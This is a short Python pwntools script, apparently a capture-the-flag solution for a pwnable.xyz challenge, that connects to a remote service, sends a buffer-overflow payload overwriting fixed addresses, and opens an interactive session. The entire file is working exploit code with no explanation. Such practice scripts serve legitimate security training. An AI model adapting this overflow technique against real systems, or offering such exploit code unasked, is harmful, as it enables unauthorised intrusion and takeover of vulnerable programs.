#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './challenge'

elf = ELF(binary)
libc = elf.libc

# io = process(binary, aslr = 0)
io = remote('svc.pwnable.xyz', 30018)
context.log_level = 'debug'
context.arch = elf.arch

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000


buf = '\0' * 0x10
buf += p64(0x4007ec)
buf = buf.ljust(0x88, '\0')
buf += p64(0x601260)
buf = buf.ljust(0xd8, '\0')
buf += p64(0x601260)
io.sendline(buf)
io.interactive()
